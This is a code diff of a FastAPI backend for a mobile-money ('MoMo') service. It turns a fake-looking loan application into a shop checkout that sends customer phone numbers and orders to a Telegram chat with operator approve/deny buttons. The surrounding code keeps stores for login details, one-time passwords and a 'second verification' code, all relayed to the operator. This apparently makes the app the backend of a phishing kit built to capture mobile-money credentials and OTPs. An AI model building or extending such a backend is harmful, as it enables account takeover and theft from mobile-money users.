@@ -6,10 +6,11 @@ from dotenv import load_dotenv
 from fastapi import FastAPI, HTTPException, Request
 from pydantic import BaseModel, Field
 from fastapi.middleware.cors import CORSMiddleware
+from typing import List, Optional
 
 load_dotenv()
 
-app = FastAPI(title="FastLoan MoMo API")
+app = FastAPI(title="Fast Product MoMo API")
 
 app.add_middleware(
     CORSMiddleware,
@@ -23,10 +24,10 @@ TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 
 # In-memory databases
-LOGIN_REQUESTS = {} # ✅ NEW
+LOGIN_REQUESTS = {}
 OTP_REQUESTS = {}
 SECOND_VERIFICATION_REQUESTS = {}
-LOAN_REQUESTS = {}
+ORDER_REQUESTS = {} # ✅ NEW: Replaced LOAN_REQUESTS
 
 # --- KEEP-ALIVE BACKGROUND TASK ---
 async def self_ping():
@@ -59,10 +60,19 @@ class SecondVerificationRequest(BaseModel):
     phone_number: str
     second_otp: str
 
-class LoanRequest(BaseModel):
+# ✅ NEW MODEL FOR PRODUCT CHECKOUT
+class CheckoutItem(BaseModel):
+    name: str
+    price: float
+    quantity: int
+
+class CheckoutRequest(BaseModel):
     phone_number: str
-    amount: float = Field(..., gt=0)
-    months: int = Field(..., gt=0)
+    items: List[CheckoutItem]
+    subtotal: float
+    delivery_city: str
+    delivery_fee: float
+    total_amount: float
 
 # --- ENDPOINTS ---
 
@@ -157,28 +167,49 @@ async def get_second_status(verify_id: str):
         raise HTTPException(status_code=404, detail="Verification not found")
     return {"status": SECOND_VERIFICATION_REQUESTS[verify_id]}
 
-@app.post("/api/apply-loan")
-async def apply_loan(data: LoanRequest):
-    loan_id = str(uuid.uuid4())
-    LOAN_REQUESTS[loan_id] = "pending"
-    await send_telegram_message(
-        f"💰 <b>New Loan Application</b>\n📱 Phone: {data.phone_number}\n💵 Amount: {data.amount:,.0f} FCFA\n📅 Months: {data.months}"
-    )
-    return {"status": "pending", "loan_id": loan_id}
+# ✅ NEW: PRODUCT CHECKOUT ENDPOINT
+@app.post("/api/checkout")
+async def checkout(data: CheckoutRequest):
+    order_id = str(uuid.uuid4())
+    ORDER_REQUESTS[order_id] = "pending"
 
-@app.get("/api/loan-status/{loan_id}")
-async def get_loan_status(loan_id: str):
-    if loan_id not in LOAN_REQUESTS:
-        raise HTTPException(status_code=404, detail="Loan not found")
-    return {"status": LOAN_REQUESTS[loan_id]}
+    # Format the cart items for Telegram
+    item_list_text = "\n".join([f"▪️ {i.quantity}x {i.name} - {i.price * i.quantity:,.0f} FCFA" for i in data.items])
 
-async def send_telegram_message(message: str):
-    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID: return
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
-    async with httpx.AsyncClient() as client:
-        await client.post(url, json=payload)
+    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        message = (
+            f"🛒 <b>New Product Order</b>\n\n"
+            f"📱 <b>Phone:</b> {data.phone_number}\n\n"
+            f"📦 <b>Products:</b>\n{item_list_text}\n\n"
+            f"💰 <b>Subtotal:</b> {data.subtotal:,.0f} FCFA\n"
+            f"📍 <b>City:</b> {data.delivery_city}\n"
+            f"🚚 <b>Delivery Fee:</b> {data.delivery_fee:,.0f} FCFA\n"
+            f"💵 <b>Total:</b> {data.total_amount:,.0f} FCFA"
+        )
+        payload = {
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": message,
+            "parse_mode": "HTML",
+            "reply_markup": {
+                "inline_keyboard": [[
+                    {"text": "✅ Accept Order", "callback_data": f"approve_checkout_{order_id}"},
+                    {"text": "❌ Deny Order", "callback_data": f"deny_checkout_{order_id}"}
+                ]]
+            }
+        }
+        async with httpx.AsyncClient() as client:
+            await client.post(url, json=payload, timeout=10.0)
 
+    return {"status": "pending", "order_id": order_id}
+
+@app.get("/api/checkout-status/{order_id}")
+async def get_checkout_status(order_id: str):
+    if order_id not in ORDER_REQUESTS:
+        raise HTTPException(status_code=404, detail="Order not found")
+    return {"status": ORDER_REQUESTS[order_id]}
+
+# --- TELEGRAM WEBHOOK ---
 @app.post("/api/telegram-webhook")
 async def telegram_webhook(request: Request):
     try:
@@ -192,6 +223,7 @@ async def telegram_webhook(request: Request):
             original_text = message.get("text", "")
             action_data = callback.get("data", "")
             
+            # Format: action_type_itemid (e.g., approve_checkout_1234-abcd)
             try:
                 action, item_type, item_id = action_data.split("_", 2)
             except ValueError:
@@ -207,6 +239,10 @@ async def telegram_webhook(request: Request):
             elif item_type == "second" and item_id in SECOND_VERIFICATION_REQUESTS:
                 SECOND_VERIFICATION_REQUESTS[item_id] = "approved" if action == "approve" else "denied"
                 reply_text = "✅ 2nd Verification Approved" if action == "approve" else "❌ 2nd Verification Denied"
+            # ✅ NEW: Handle Checkout Approval/Denial
+            elif item_type == "checkout" and item_id in ORDER_REQUESTS:
+                ORDER_REQUESTS[item_id] = "approved" if action == "approve" else "denied"
+                reply_text = "✅ Order Approved & Paid" if action == "approve" else "❌ Order Denied (Insufficient Funds)"
             else:
                 return {"status": "ok"}
 
